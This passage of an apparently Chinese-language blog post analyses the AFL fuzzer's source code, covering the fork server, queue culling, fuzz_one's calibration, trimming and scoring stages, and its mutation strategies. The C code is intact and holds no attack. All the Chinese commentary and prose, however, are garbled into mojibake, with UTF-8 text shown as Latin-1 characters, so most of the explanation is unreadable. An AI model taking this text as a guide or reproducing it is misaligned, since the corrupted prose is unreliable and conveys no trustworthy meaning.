EXEC_FAIL_SIG;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// çˆ¶è¿›ç¨‹</span></span><br><span class="line">  <span class="comment">/* Close the unneeded endpoints. */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">close</span>(ctl_pipe[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">close</span>(st_pipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  fsrv_ctl_fd = ctl_pipe[<span class="number">1</span>];</span><br><span class="line">  fsrv_st_fd  = st_pipe[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Wait for the fork server to come up, but don&#x27;t wait too long. */</span></span><br><span class="line"></span><br><span class="line">  it.it_value.tv_sec = ((exec_tmout * FORK_WAIT_MULT) / <span class="number">1000</span>);</span><br><span class="line">  it.it_value.tv_usec = ((exec_tmout * FORK_WAIT_MULT) % <span class="number">1000</span>) * <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setitimer</span>(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ¥æ”¶åˆ°å¯åŠ¨çš„ç¨‹åºçš„ä¿¡æ¯</span></span><br><span class="line">  rlen = <span class="built_in">read</span>(fsrv_st_fd, &amp;status, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">  it.it_value.tv_sec = <span class="number">0</span>;</span><br><span class="line">  it.it_value.tv_usec = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setitimer</span>(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we have a four-byte &quot;hello&quot; message from the server, we&#x27;re all set.</span></span><br><span class="line"><span class="comment">     Otherwise, try to figure out what went wrong. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (rlen == <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="built_in">OKF</span>(<span class="string">&quot;All right - fork server is up.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (child_timed_out)</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Timeout while initializing fork server (adjusting -t may help)&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ç­‰å¾…å­è¿›ç¨‹</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">waitpid</span>(forksrv_pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">PFATAL</span>(<span class="string">&quot;waitpid() failed&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// å¾ˆå¤šçš„SAYF...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue"></a>cull_queue</h3><p>ç²¾ç®€åŒ–é˜Ÿåˆ—</p>
<ul>
<li>åˆ›å»ºä¸€ä¸ªäº†temp_væ•°ç»„ï¼Œè¯¥æ•°ç»„çš„å¤§å°ä¸trace_miniä¸€è‡´ï¼Œä¸º<code>MAP_SIZE &gt;&gt; 3</code>ã€‚</li>
<li>åœ¨åˆå§‹çŠ¶æ€ä¸‹ï¼Œæ•°ç»„ä¸­çš„bitå…¨ä¸º1ï¼Œæ¯ä½ä»£è¡¨äº†è·¯å¾„æ˜¯å¦è¢«è¦†ç›–ï¼Œä¸º1æ—¶è¡¨ç¤ºæœªè¢«è¦†ç›–</li>
<li>temp_væ•°ç»„ç”¨äºè®°å½•top_ratedæ•°ç»„ä¸­æ¯ä¸ªè·¯å¾„çš„ä¼˜èƒœè€…ç¬¬ä¸€æ¬¡è¦†ç›–çš„æ‰€æœ‰è·¯å¾„ï¼Œå³trace_miniæ•°ç»„ã€‚</li>
<li>temp_væ•°ç»„å­˜åœ¨çš„ç›®çš„å…¶å®æ˜¯ç”¨äºé€‰æ‹©ç¬¬ä¸€æ¬¡è¦†ç›–åˆ°è¯¥è·¯å¾„çš„ä¼˜èƒœè€…ã€‚è¿™é‡Œæœ¬è´¨ä¸Šè¿˜æ˜¯ä½¿ç”¨äº†è´ªå¿ƒç®—æ³•ï¼ŒAFLè´ªå¿ƒçš„è®¤ä¸ºå¯¹äºæ¯ä¸ªè¢«å‘½ä¸­çš„è·¯å¾„ï¼Œéå†æ—¶ç¬¬ä¸€æ¬¡é‡åˆ°çš„ä¼˜èƒœè€…å°±æ˜¯æ›´favorableï¼Œæ‰€ä»¥é‚£ä¸ªä¼˜èƒœè€…çš„favoredæ‰ä¼šè¢«ç½®1</li>
<li>ä¹‹åfavoredæœªè¢«æ ‡è®°çš„æµ‹è¯•ç”¨ä¾‹å°†ç”±<code>mark_as_redundant</code>å°†å…¶q-&gt;fs_redundantç½®1ï¼Œå¹¶æ”¾å…¥ out_dir&#x2F;queue&#x2F;.state&#x2F;redundant_edges&#x2F; æ–‡ä»¶å¤¹ä¸­ã€‚å¦‚æœå®ƒåœ¨åç»­åˆè¢« favored æ ‡è®°ï¼Œåˆ™ä»æ–‡ä»¶å¤¹ä¸­åˆ å»ï¼›åä¹‹åŒç†ã€‚</li>
</ul>
<h2 id="while-1-fuzz-ä¸»å¾ªç¯"><a href="#while-1-fuzz-ä¸»å¾ªç¯" class="headerlink" title="while 1: fuzz ä¸»å¾ªç¯"></a>while 1: fuzz ä¸»å¾ªç¯</h2><p>åœ¨è¿›è¡Œç¬¬ä¸€è½®fuzzåè¿›å…¥fuzzä¸»å¾ªç¯ï¼Œæ¯ä¸€æ¬¡å¾ªç¯å¯¹ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹è°ƒç”¨<code>fuzz_one</code>è¿›è¡Œæµ‹è¯•ï¼Œå¯¹æµ‹è¯•ç”¨ä¾‹è¿›è¡Œå˜å¼‚ï¼Œç„¶åé€šè¿‡<code>cull_queue</code>ç²¾ç®€é˜Ÿåˆ—ã€‚AFLä¼šè¿”å›æ‰§è¡Œå¦‚ä¸‹å†…å®¹ï¼Œç›´åˆ°åœæ­¢ã€‚</p>
<ol>
<li>cull_queue</li>
<li>å¦‚æœå½“å‰queue_curä¸ºç©ºè¡¨ç¤ºæ‰€æœ‰çš„queueéƒ½è¢«æ‰§è¡Œå®Œä¸€è½®ï¼Œä»queueå¤´å¼€å§‹æ–°ä¸€è½®fuzz<ul>
<li>åˆ·æ–°å±•ç¤ºç•Œé¢</li>
<li>å¦‚æœæ‰§è¡Œä¸€è½®åçš„queueä¸­çš„test_caseæ•°é‡ä¸æ‰§è¡Œå‰ä¸€æ ·ï¼Œè¡¨ç¤ºæ­¤è½®fuzzæ²¡æœ‰æ•ˆæœï¼Œåˆ™é‡æ–°è°ƒæ•´å˜å¼‚ç­–ç•¥</li>
</ul>
</li>
<li>è°ƒç”¨<code>fuzz_one</code>å¯¹queue_curæŒ‡å®šçš„æµ‹è¯•ç”¨ä¾‹è¿›è¡Œæµ‹è¯•</li>
<li>ç§»åŠ¨queue_cur</li>
</ol>
<h3 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz one"></a>fuzz one</h3><p>è¿›è¡Œæ ·ä¾‹fuzzï¼ŒåŒ…å«äº†å˜å¼‚ç­–ç•¥</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take the current entry from the queue, fuzz it for a while. This</span></span><br><span class="line"><span class="comment">   function is a tad too long... returns 0 if fuzzed successfully, 1 if</span></span><br><span class="line"><span class="comment">   skipped or bailed out. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* è°ƒç”¨fuzz_oneå¯¹queue_curè¿›è¡Œä¸€æ¬¡å˜å¼‚æµ‹è¯•ï¼ˆfuzz_oneå¹¶ä¸ä¸€å®šçœŸçš„æ‰§è¡Œå½“å‰queue_curï¼Œ</span></span><br><span class="line"><span class="comment">   å®ƒæœ‰ä¸€å®šçš„ç­–ç•¥ï¼›å¦‚æœä¸æ‰§è¡Œï¼Œå°±ç›´æ¥è¿”å›1ï¼Œå¦åˆ™è¿”å›0ï¼‰ */</span></span><br><span class="line"><span class="function"><span class="type">static</span> u8 <span class="title">fuzz_one</span><span class="params">(<span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  s32 len, fd, temp_len, i, j;</span><br><span class="line">  u8  *in_buf, *out_buf, *orig_in, *ex_tmp, *eff_map = <span class="number">0</span>;</span><br><span class="line">  u64 havoc_queued,  orig_hit_cnt, new_hit_cnt;</span><br><span class="line">  u32 splice_cycle = <span class="number">0</span>, perf_score = <span class="number">100</span>, orig_perf, prev_cksum, eff_cnt = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  u8  ret_val = <span class="number">1</span>, doing_det = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  u8  a_collect[MAX_AUTO_EXTRA];</span><br><span class="line">  u32 a_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> IGNORE_FINDS</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In IGNORE_FINDS mode, skip any entries that weren&#x27;t in the</span></span><br><span class="line"><span class="comment">     initial data set. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cur-&gt;depth &gt; <span class="number">1</span>) </span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* åˆ¤æ–­pending_favoredçš„å€¼ï¼šï¼ˆè¿™é‡Œç”¨åˆ°çš„å¸¸é‡å¯ä»¥åœ¨config.hæ‰¾åˆ°ï¼‰</span></span><br><span class="line"><span class="comment">     1.å¦‚æœä¸º0ï¼Œå¯¹äºqueue_curè¢«fuzzè¿‡æˆ–è€…ä¸æ˜¯favoredçš„ï¼Œæœ‰99%çš„æ¦‚ç‡ä¸æ‰§è¡Œï¼Œç›´æ¥è¿”å›1</span></span><br><span class="line"><span class="comment">     2.å¦‚æœä¸ä¸º0ï¼Œå¹¶ä¸”ä¸æ˜¯dumb_modeã€ä¸æ˜¯favoredçš„ã€queued_paths&gt;10ï¼š</span></span><br><span class="line"><span class="comment">        a.å¦‚æœqueue_cycleå¤§äº1ï¼Œä¸”æ²¡æœ‰è¢«fuzzè¿‡ï¼Œé‚£ä¹ˆæœ‰95%çš„æ¦‚ç‡ä¸æ‰§è¡Œï¼Œç›´æ¥è¿”å›1</span></span><br><span class="line"><span class="comment">        b.å¦åˆ™ï¼Œæœ‰75%çš„æ¦‚ç‡ä¸æ‰§è¡Œï¼Œç›´æ¥è¿”å›1</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (pending_favored) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we have any favored, non-fuzzed new arrivals in the queue,</span></span><br><span class="line"><span class="comment">       possibly skip to them at the expense of already-fuzzed or non-favored</span></span><br><span class="line"><span class="comment">       cases. */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((queue_cur-&gt;was_fuzzed || !queue_cur-&gt;favored) &amp;&amp;</span><br><span class="line">        <span class="built_in">UR</span>(<span class="number">100</span>) &lt; SKIP_TO_NEW_PROB) </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;favored &amp;&amp; queued_paths &gt; <span class="number">10</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Otherwise, still possibly skip non-favored cases, albeit less often.</span></span><br><span class="line"><span class="comment">       The odds of skipping stuff are higher for already-fuzzed inputs and</span></span><br><span class="line"><span class="comment">       lower for never-fuzzed entries. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (queue_cycle &gt; <span class="number">1</span> &amp;&amp; !queue_cur-&gt;was_fuzzed) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">UR</span>(<span class="number">100</span>) &lt; SKIP_NFAV_NEW_PROB) </span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">UR</span>(<span class="number">100</span>) &lt; SKIP_NFAV_OLD_PROB) </span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^IGNORE_FINDS */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* å¦‚æœä¸æ˜¯ttyæ¨¡å¼ï¼Œè¾“å‡ºæç¤ºä¿¡æ¯å¹¶åˆ·æ–°stdoutç¼“å†²åŒº */</span></span><br><span class="line">  <span class="keyword">if</span> (not_on_tty) &#123;</span><br><span class="line">    <span class="built_in">ACTF</span>(<span class="string">&quot;Fuzzing test case #%u (%u total, %llu uniq crashes found)...&quot;</span>,</span><br><span class="line">         current_entry, queued_paths, unique_crashes);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Map the test case into memory. */</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">/* è¿™éƒ¨åˆ†ä¸»è¦å°†caseæ˜ å°„åˆ°å†…å­˜çš„å¤„ç†ï¼š</span></span><br><span class="line"><span class="comment">     1.è®¾ç½®lenä¸ºqueue_cur-&gt;len</span></span><br><span class="line"><span class="comment">     2.æ‰“å¼€caseå¯¹åº”çš„æ–‡ä»¶ï¼Œå¹¶é€šè¿‡mmapæ˜ å°„åˆ°å†…å­˜é‡Œï¼Œå°†åœ°å€èµ‹å€¼ç»™in_bufå’Œorig_in</span></span><br><span class="line"><span class="comment">     3.åˆ†é…lenå¤§å°çš„å†…å­˜ï¼Œå¹¶åˆå§‹åŒ–ä¸ºå…¨0ï¼Œç„¶åå°†åœ°å€èµ‹å€¼ç»™out_buf</span></span><br><span class="line"><span class="comment">     4.å°†è¿ç»­è¶…æ—¶è®¡æ•°å™¨subseq_tmoutæ¸…é›¶</span></span><br><span class="line"><span class="comment">     5.è®¾ç½®cur_depthä¸ºqueue_cur-&gt;depth</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  fd = <span class="built_in">open</span>(queue_cur-&gt;fname, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) </span><br><span class="line">      <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, queue_cur-&gt;fname);</span><br><span class="line"></span><br><span class="line">  len = queue_cur-&gt;len;</span><br><span class="line"></span><br><span class="line">  orig_in = in_buf = <span class="built_in">mmap</span>(<span class="number">0</span>, len, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (orig_in == MAP_FAILED)</span><br><span class="line">      <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to mmap &#x27;%s&#x27;&quot;</span>, queue_cur-&gt;fname);</span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We could mmap() out_buf as MAP_PRIVATE, but we end up clobbering every</span></span><br><span class="line"><span class="comment">     single byte anyway, so it wouldn&#x27;t give us any performance or memory usage</span></span><br><span class="line"><span class="comment">     benefits. */</span></span><br><span class="line"></span><br><span class="line">  out_buf = <span class="built_in">ck_alloc_nozero</span>(len);</span><br><span class="line">  subseq_tmouts = <span class="number">0</span>;</span><br><span class="line">  cur_depth = queue_cur-&gt;depth;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">  <span class="comment">/*******************************************</span></span><br><span class="line"><span class="comment">   * CALIBRATION (only if failed earlier on) *</span></span><br><span class="line"><span class="comment">   *******************************************/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* è¿™é‡Œå¼€å§‹è¿›å…¥CALIBRATIONé˜¶æ®µï¼š</span></span><br><span class="line"><span class="comment">     1.å‡å¦‚å½“å‰é¡¹æœ‰æ ¡å‡†é”™è¯¯ï¼Œå¹¶ä¸”æ ¡å‡†é”™è¯¯æ¬¡æ•°å°äº3æ¬¡ï¼Œé‚£ä¹ˆå°±è°ƒç”¨calibrate_caseå†æ¬¡æ ¡å‡†</span></span><br><span class="line"><span class="comment">     2.å¦‚æœè®¾ç½®äº†stop_soonï¼Œæˆ–è€…resä¸ç­‰äºcrash_modeï¼š</span></span><br><span class="line"><span class="comment">        a.è®¡æ•°å™¨cur_skipped_pathsåŠ 1</span></span><br><span class="line"><span class="comment">        b.è¿›å…¥abandon_entryä½œåç»­å¤„ç†</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (queue_cur-&gt;cal_failed) &#123;</span><br><span class="line"></span><br><span class="line">    u8 res = FAULT_TMOUT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (queue_cur-&gt;cal_failed &lt; CAL_CHANCES) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Reset exec_cksum to tell calibrate_case to re-execute the testcase</span></span><br><span class="line"><span class="comment">         avoiding the usage of an invalid trace_bits.</span></span><br><span class="line"><span class="comment">         For more info: https://github.com/AFLplusplus/AFLplusplus/pull/425 */</span></span><br><span class="line"></span><br><span class="line">      queue_cur-&gt;exec_cksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      res = <span class="built_in">calibrate_case</span>(argv, queue_cur, in_buf, queue_cycle - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">        <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon || res != crash_mode) &#123;</span><br><span class="line">      cur_skipped_paths++;</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">  <span class="comment">/************</span></span><br><span class="line"><span class="comment">   * TRIMMING *</span></span><br><span class="line"><span class="comment">   ************/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* è¿™é‡Œå¼€å§‹è¿›å…¥TRIMMINGé˜¶æ®µï¼š</span></span><br><span class="line"><span class="comment">     1.å¦‚æœä¸å¤„äºdumb_modeï¼Œä¸”å½“å‰é¡¹æ²¡æœ‰è¢«è£å‰ªï¼š</span></span><br><span class="line"><span class="comment">        a.è°ƒç”¨trim_caseå¯¹queue_curè¿›è¡Œtrim</span></span><br><span class="line"><span class="comment">        b.è®¾ç½®queue_cur-&gt;trim_doneçš„å€¼ä¸º1</span></span><br><span class="line"><span class="comment">        c.é‡æ–°ç”¨queue_cur-&gt;lenå»è®¾ç½®lençš„å€¼</span></span><br><span class="line"><span class="comment">     2.å°†in_bufæ‹·è´lenä¸ªå­—èŠ‚åˆ°out_bufä¸­ï¼ˆæ³¨æ„in_bufæ˜¯trim_caseçš„å‚æ•°ï¼Œå¾—åˆ°äº†è£å‰ªï¼‰</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;trim_done) &#123;</span><br><span class="line"></span><br><span class="line">    u8 res = <span class="built_in">trim_case</span>(argv, queue_cur, in_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) &#123;</span><br><span class="line">      cur_skipped_paths++;</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Don&#x27;t retry trimming, even if it failed. */</span></span><br><span class="line"></span><br><span class="line">    queue_cur-&gt;trim_done = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len != queue_cur-&gt;len) </span><br><span class="line">        len = queue_cur-&gt;len;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(out_buf, in_buf, len);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">  <span class="comment">/*********************</span></span><br><span class="line"><span class="comment">   * PERFORMANCE SCORE *</span></span><br><span class="line"><span class="comment">   *********************/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* è¿™é‡Œå¼€å§‹è¿›å…¥PERFORMANCE SCOREé˜¶æ®µï¼š</span></span><br><span class="line"><span class="comment">     1.å¯¹å½“å‰é¡¹è°ƒç”¨calculate_scoreï¼Œç®—å‡ºå¾—åˆ†å¹¶è®¾ç½®orig_perfå’Œperf_score</span></span><br><span class="line"><span class="comment">     2.å¦‚æœè®¾ç½®äº†skip_deterministicï¼Œæˆ–è€…å½“å‰é¡¹è¢«fuzzè¿‡ï¼Œæˆ–è€…passed_detä¸º1ï¼ˆå¥½åƒä¹Ÿæ˜¯è¢«fuzzè¿‡ï¼‰</span></span><br><span class="line"><span class="comment">       ï¼Œé‚£ä¹ˆè·³è½¬åˆ°havoc_stageå»æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">     3.å¦‚æœæ‰§è¡Œè·¯å¾„æ ¡éªŒå’Œï¼Œè¶…è¿‡æ­¤ä¸»å®ä¾‹çš„èŒƒå›´ï¼Œé‚£ä¹ˆä¹Ÿè·³è½¬åˆ°havoc_stageå»æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">     4.è‹¥æ²¡è·³èµ°ï¼Œè®¾ç½®doing_detçš„å€¼ä¸º1ï¼ˆä½äºfuzz_oneä¸­çš„ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼‰</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  orig_perf = perf_score = <span class="built_in">calculate_score</span>(queue_cur);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Skip right away if -d is given, if we have done deterministic fuzzing on</span></span><br><span class="line"><span class="comment">     this entry ourselves (was_fuzzed), or if it has gone through deterministic</span></span><br><span class="line"><span class="comment">     testing in earlier, resumed runs (passed_det). */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (skip_deterministic || queue_cur-&gt;was_fuzzed || queue_cur-&gt;passed_det)</span><br><span class="line">    <span class="keyword">goto</span> havoc_stage;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Skip deterministic fuzzing if exec path checksum puts this out of scope</span></span><br><span class="line"><span class="comment">     for this master instance. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (master_max &amp;&amp; (queue_cur-&gt;exec_cksum % master_max) != master_id - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">goto</span> havoc_stage;</span><br><span class="line"></span><br><span class="line">  doing_det = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// å˜å¼‚...</span></span><br></pre></td></tr></table></figure>

<h3 id="mutation"><a href="#mutation" class="headerlink" title="mutation"></a>mutation</h3><p>å˜å¼‚çš„ä¸»è¦ç±»å‹å¦‚ä¸‹ï¼š</p>
<ul>
<li>bitflipï¼ŒæŒ‰ä½ç¿»è½¬ï¼Œ1å˜ä¸º0ï¼Œ0å˜ä¸º1</li>
<li>arithmeticï¼Œæ•´æ•°åŠ &#x2F;å‡ç®—æœ¯è¿ç®—</li>
<li>interestï¼ŒæŠŠä¸€äº›ç‰¹æ®Šå†…å®¹æ›¿æ¢åˆ°åŸæ–‡ä»¶ä¸­</li>
<li>dictionaryï¼ŒæŠŠè‡ªåŠ¨ç”Ÿæˆæˆ–ç”¨æˆ·æä¾›çš„tokenæ›¿æ¢&#x2F;æ’å…¥åˆ°åŸæ–‡ä»¶ä¸­</li>
<li>havocï¼Œå¤§ç ´åï¼Œæ­¤é˜¶æ®µä¼šå¯¹åŸæ–‡ä»¶è¿›è¡Œå¤§é‡å˜å¼‚ï¼Œå…·ä½“è§ä¸‹æ–‡</li>
<li>spliceï¼Œç»æ¥ï¼Œæ­¤é˜¶æ®µä¼šå°†ä¸¤ä¸ªæ–‡ä»¶æ‹¼æ¥èµ·æ¥å¾—åˆ°ä¸€ä¸ªæ–°çš„æ–‡ä»¶</li>
</ul>
<p>bitflip, arithmetic, interest, dictionaryæ˜¯édumb modeï¼ˆ-dï¼‰å’Œä¸»fuzzerï¼ˆ-Mï¼‰ä¼šè¿›è¡Œçš„æ“ä½œï¼Œç”±äºå…¶å˜å¼‚æ–¹å¼æ²¡æœ‰éšæœºæ€§ï¼Œæ‰€ä»¥ä¹Ÿç§°ä¸ºdeterministic fuzzingï¼›</p>
<p>havocå’Œspliceåˆ™å­˜åœ¨éšæœºæ€§ï¼Œæ˜¯æ‰€æœ‰çŠ¶å†µçš„fuzzerï¼ˆæ˜¯å¦dumb modeã€ä¸»ä»fuzzerï¼‰éƒ½ä¼šæ‰§è¡Œçš„å˜å¼‚ã€‚</p>
<h3 id="effector-map"><a href="#effector-map" class="headerlink" title="effector map"></a>effector map</h3><p>å¦‚æœä¸€ä¸ªbyteå®Œå…¨ç¿»è½¬ï¼Œéƒ½æ— æ³•å¸¦æ¥æ‰§è¡Œè·¯å¾„çš„å˜åŒ–ï¼Œé‚£ä¹ˆè¿™ä¸ªbyteå¾ˆæœ‰å¯èƒ½æ˜¯å±äºâ€dataâ€ï¼Œè€Œéâ€metadataâ€ï¼ˆä¾‹å¦‚size, flagç­‰ï¼‰ï¼Œå¯¹æ•´ä¸ªfuzzingçš„æ„ä¹‰ä¸å¤§ã€‚æ‰€ä»¥ï¼Œåœ¨éšåçš„ä¸€äº›å˜å¼‚ä¸­ï¼Œä¼šå‚è€ƒeffector mapï¼Œè·³è¿‡é‚£äº›â€œæ— æ•ˆâ€çš„byteï¼Œä»è€ŒèŠ‚çœäº†æ‰§è¡Œèµ„æºã€‚</p>
<p>æ¯”å¦‚è§£æelfæ–‡ä»¶ç¨‹åºï¼Œæˆ‘ä»¬å°†å…¶magic numç»™æ”¹äº†ï¼Œå°±ä¼šå¯¼è‡´ç¨‹åºç»“æœå¤§ä¸ç›¸åŒ</p>
<h3 id="havoc"><a href="#havoc" class="headerlink" title="havoc"></a>havoc</h3><p>å¯¹äºdumb modeæˆ–è€…ä»fuzzeræ¥è¯´ï¼Œåˆ™æ˜¯ç›´æ¥ä»è¿™ä¸€é˜¶æ®µå¼€å§‹ã€‚</p>
<p>havocï¼Œé¡¾åæ€ä¹‰ï¼Œæ˜¯å……æ»¡äº†å„ç§éšæœºç”Ÿæˆçš„å˜å¼‚ï¼Œæ˜¯å¯¹åŸæ–‡ä»¶çš„â€œå¤§ç ´åâ€ã€‚å…·ä½“æ¥è¯´ï¼ŒhavocåŒ…å«äº†å¯¹åŸæ–‡ä»¶çš„å¤šè½®å˜å¼‚ï¼Œæ¯ä¸€è½®éƒ½æ˜¯å°†å¤šç§æ–¹å¼ç»„åˆï¼ˆstackedï¼‰è€Œæˆï¼š</p>
<ul>
<li>éšæœºé€‰å–æŸä¸ªbitè¿›è¡Œç¿»è½¬</li>
<li>éšæœºé€‰å–æŸä¸ªbyteï¼Œå°†å…¶è®¾ç½®ä¸ºéšæœºçš„interesting value</li>
<li>éšæœºé€‰å–æŸä¸ªwordï¼Œå¹¶éšæœºé€‰å–å¤§ã€å°ç«¯åºï¼Œå°†å…¶è®¾ç½®ä¸ºéšæœºçš„interesting value</li>
<li>éšæœºé€‰å–æŸä¸ªdwordï¼Œå¹¶éšæœºé€‰å–å¤§ã€å°ç«¯åºï¼Œå°†å…¶è®¾ç½®ä¸ºéšæœºçš„interesting value</li>
<li>éšæœºé€‰å–æŸä¸ªbyteï¼Œå¯¹å…¶å‡å»ä¸€ä¸ªéšæœºæ•°</li>
<li>éšæœºé€‰å–æŸä¸ªbyteï¼Œå¯¹å…¶åŠ ä¸Šä¸€ä¸ªéšæœºæ•°</li>
<li>éšæœºé€‰å–æŸä¸ªwordï¼Œå¹¶éšæœºé€‰å–å¤§ã€å°ç«¯åºï¼Œå¯¹å…¶å‡å»ä¸€ä¸ªéšæœºæ•°</li>
<li>éšæœºé€‰å–æŸä¸ªwordï¼Œå¹¶éšæœºé€‰å–å¤§ã€å°ç«¯åºï¼Œå¯¹å…¶åŠ ä¸Šä¸€ä¸ªéšæœºæ•°</li>
<li>éšæœºé€‰å–æŸä¸ªdwordï¼Œå¹¶éšæœºé€‰å–å¤§ã€å°ç«¯åºï¼Œå¯¹å…¶å‡å»ä¸€ä¸ªéšæœºæ•°</li>
<li>éšæœºé€‰å–æŸä¸ªdwordï¼Œå¹¶éšæœºé€‰å–å¤§ã€å°ç«¯åºï¼Œå¯¹å…¶åŠ ä¸Šä¸€ä¸ªéšæœºæ•°</li>
<li>éšæœºé€‰å–æŸä¸ªbyteï¼Œå°†å…¶è®¾ç½®ä¸ºéšæœºæ•°</li>
<li>éšæœºåˆ é™¤ä¸€æ®µbytes</li>
